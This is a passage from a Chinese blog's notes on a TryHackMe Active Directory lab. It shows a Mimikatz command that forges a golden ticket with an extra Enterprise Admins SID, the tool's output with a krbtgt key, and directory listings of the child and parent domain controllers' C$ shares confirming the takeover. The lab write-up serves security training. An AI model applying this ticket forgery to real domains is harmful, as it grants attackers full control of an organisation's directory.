/user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:&lt;Password hash of krbtgt user&gt; /sids:&lt;SID of Enterprise Admins group&gt; /ptt</span><br><span class="line">User      : Administrator</span><br><span class="line">Domain    : za.tryhackme.loc (ZA)</span><br><span class="line">SID       : S-1-5-21-3885271727-2693558621-2658995185-1001</span><br><span class="line">User Id   : 500</span><br><span class="line">Groups Id : *513 512 520 518 519</span><br><span class="line">Extra SIDs: S-1-5-21-3330634377-1326264276-632209373-519 ;</span><br><span class="line">ServiceKey: 16f9af38fca3ada405386b3b57366082 - rc4_hmac_nt</span><br><span class="line">Service   : krbtgt</span><br><span class="line">Lifetime  : 4/30/2022 7:52:51 PM ; 4/27/2032 7:52:51 PM ; 4/27/2032 7:52:51 PM</span><br><span class="line">-&gt; Ticket : ** Pass The Ticket **</span><br><span class="line"></span><br><span class="line"> * PAC generated</span><br><span class="line"> * PAC signed</span><br><span class="line"> * EncTicketPart generated</span><br><span class="line"> * EncTicketPart encrypted</span><br><span class="line"> * KrbCred generated</span><br><span class="line"></span><br><span class="line">Golden ticket for 'Administrator @ za.tryhackme.loc' successfully submitted for current session</span><br></pre></td></tr></tbody></table></figure>

<p>首先，我们将验证此票证是否可用于访问 THMDC，因为它是子域管理员用户的有效票证：</p>
<p> 命令提示符</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         C:\&gt;dir \\thmdc.za.tryhackme.loc\c$</span><br><span class="line"> Volume in drive \\thmdc.za.tryhackme.loc\c$ is Windows</span><br><span class="line"> Volume Serial Number is 1634-22A9</span><br><span class="line"></span><br><span class="line"> Directory of \\thmdc.za.tryhackme.loc\c$</span><br><span class="line"></span><br><span class="line">01/04/2022  08:47 AM               103 delete-vagrant-user.ps1</span><br><span class="line">04/30/2022  10:24 AM               154 dns_entries.csv</span><br><span class="line">09/15/2018  08:19 AM    &lt;DIR&gt;          PerfLogs</span><br><span class="line">03/21/2020  09:31 PM    &lt;DIR&gt;          Program Files</span><br><span class="line">03/21/2020  09:28 PM    &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">04/27/2022  08:27 AM             1,423 thm-network-setup-dc.ps1</span><br><span class="line">04/25/2022  07:13 PM    &lt;DIR&gt;          tmp</span><br><span class="line">04/27/2022  08:22 AM    &lt;DIR&gt;          Users</span><br><span class="line">04/25/2022  07:11 PM    &lt;SYMLINKD&gt;     vagrant [\\vboxsvr\vagrant]</span><br><span class="line">04/27/2022  08:12 PM    &lt;DIR&gt;          Windows</span><br><span class="line">               7 File(s)      2,356,811 bytes</span><br><span class="line">               7 Dir(s)  50,913,189,888 bytes free;</span><br></pre></td></tr></tbody></table></figure>

<p>这至少证实了金票是为了访问子 DC 而伪造的。 但是，由于我们指定了额外的 SID，因此我们现在还应该可以访问父 DC：</p>
<p> 命令提示符</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         C:\&gt;dir \\thmrootdc.tryhackme.loc\c$\</span><br><span class="line"> Volume in drive \\thmrootdc.tryhackme.loc\c$ is Windows</span><br><span class="line"> Volume Serial Number is 1634-22A9</span><br><span class="line"></span><br><span class="line"> Directory of \\thmrootdc.tryhackme.loc\c$</span><br><span class="line"></span><br><span class="line">01/04/2022  08:47 AM               103 delete-vagrant-user.ps1</span><br><span class="line">09/15/2018  08:19 AM    &lt;DIR&gt;          PerfLogs</span><br><span class="line">03/21/2020  09:31 PM    &lt;DIR&gt;          Program Files</span><br><span class="line">03/21/2020  09:25 PM    &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">04/23/2022  09:21 AM                58 root_dns_entries.csv</span><br><span class="line">04/23/2022  09:22 AM             1,432 thm-network-setup-dc.ps1</span><br><span class="line">04/25/2022  05:50 PM    &lt;DIR&gt;          tmp</span><br><span class="line">04/27/2022  07:54 AM    &lt;DIR&gt;          Users</span><br><span class="line">04/25/2022  05:50 PM    &lt;SYMLINKD&gt;     vagrant [\\vboxsvr\vagrant]</span><br><span class="line">04/27/2022  06:29 PM    &lt;DIR&gt;          Windows</span><br><span class="line">               3 File(s)          1,593 bytes</span><br><span class="line">               7 Dir(s)  51,105,730,560 bytes free</span><br></pre></td></tr></tbody></table></figure>

<p>这证明我们现在仅通过破坏其中一个子域就完全破坏了父域！</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://mikannse.space">Mikannse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://mikannse.space/2024/04/27/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0ExploitingActiveDirectory/">http://mikannse.space/2024/04/27/THM域学习ExploitingActiveDirectory/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mikannse.space" target="_blank">MikannseのSekai</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a><a class="post-meta__tags" href="/tags/Domain/">Domain</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/04/28/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%B8%80%E4%B8%89)%E4%B9%8BTHMAnthem/" title="打靶记录(一一三)之THMAnthem"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">打靶记录(一一三)之THMAnthem</div></div></a></div><div class="next-post pull-right"><a href="/2024/04/25/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0LateralMovementandPivoting/" title="THM域学习LateralMovementandPivoting"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">THM域学习LateralMovementandPivoting</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/04/30/THMZeroLogon/" title="THMZeroLogon"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-30</div><div class="title">THMZeroLogon</div></div></a></div><div><a href="/2024/04/12/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0BreachingActiveDirectory/" title="THM域学习BreachingActiveDirectory"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-12</div><div class="title">THM域学习BreachingActiveDirectory</div></div></a></div><div><a href="/2024/04/12/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0ActiveDirectoryBasics/" title="THM域学习ActiveDirectoryBasics"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-12</div><div class="title">THM域学习ActiveDirectoryBasics</div></div></a></div><div><a href="/2024/05/21/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0CredentialsHarvesting/" title="THM域学习CredentialsHarvesting"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-21</div><div class="title">THM域学习CredentialsHarvesting</div></div></a></div><div><a href="/2024/04/13/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0EnumeratingActiveDirectory/" title="THM域学习EnumeratingActiveDirectory"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-13</div><div class="title">THM域学习EnumeratingActiveDirectory</div></div></a></div><div><a href="/2024/04/25/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0LateralMovementandPivoting/" title="THM域学习LateralMovementandPivoting"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-25</div><div class="title">THM域学习LateralMovementandPivoting</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mikannse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">303</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">74</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mikannse/mikannse.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">暂时没有公告QAQ</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploiting-Permission-Delegation"><span class="toc-number">2.</span> <span class="toc-text">Exploiting Permission Delegation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploiting-Automated-Relays"><span class="toc-number">3.</span> <span class="toc-text">Exploiting Automated Relays</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploiting-AD-Users"><span class="toc-number">4.</span> <span class="toc-text">Exploiting AD Users</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploiting-GPOs"><span class="toc-number">5.</span> <span class="toc-text">Exploiting GPOs</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploiting-Certificates"><span class="toc-number">6.</span> <span class="toc-text">Exploiting Certificates</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploiting-Domain-Trusts"><span class="toc-number">7.</span> <span class="toc-text">Exploiting Domain Trusts</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/15/THMWindowsEventLogs/" title="THMWindowsEventLogs">THMWindowsEventLogs</a><time datetime="2024-11-14T16:20:53.000Z" title="发表于 2024-11-15 00:20:53">2024-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/14/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AC%AC%E5%9B%9B%E7%AB%A0/" title="玄机应急响应第四章">玄机应急响应第四章</a><time datetime="2024-11-14T12:39:37.000Z" title="发表于 2024-11-14 20:39:37">2024-11-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/14/THMIntrotoEndpointSecurity/" title="THMIntrotoEndpointSecurity">THMIntrotoEndpointSecurity</a><time datetime="2024-11-14T09:08:33.000Z" title="发表于 2024-11-14 17:08:33">2024-11-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/13/Python3%E7%88%AC%E8%99%AB%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0%E7%AC%AC%E4%B8%80,%E4%BA%8C%E7%AB%A0%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80%E5%92%8C%E5%B8%B8%E7%94%A8%E5%BA%93/" title="Python3爬虫开发笔记第一,二章爬虫基础和常用库">Python3爬虫开发笔记第一,二章爬虫基础和常用库</a><time datetime="2024-11-13T13:46:32.000Z" title="发表于 2024-11-13 21:46:32">2024-11-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/12/THMDynamicAnalysisDebugging/" title="THMDynamicAnalysisDebugging">THMDynamicAnalysisDebugging</a><time datetime="2024-11-12T14:56:18.000Z" title="发表于 2024-11-12 22:56:18">2024-11-12</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Mikannse</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '',
      appKey: '',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function loadDisqus () {
  const disqus_config = function () {
    this.page.url = 'http://mikannse.space/2024/04/27/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0ExploitingActiveDirectory/'
    this.page.identifier = '/2024/04/27/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0ExploitingActiveDirectory/'
    this.page.title = 'THM域学习ExploitingActiveDirectory'
  }

  const disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  btf.addModeChange('disqus', disqusReset)

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }
}

if ('Valine' === 'Disqus' || !true) {
  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>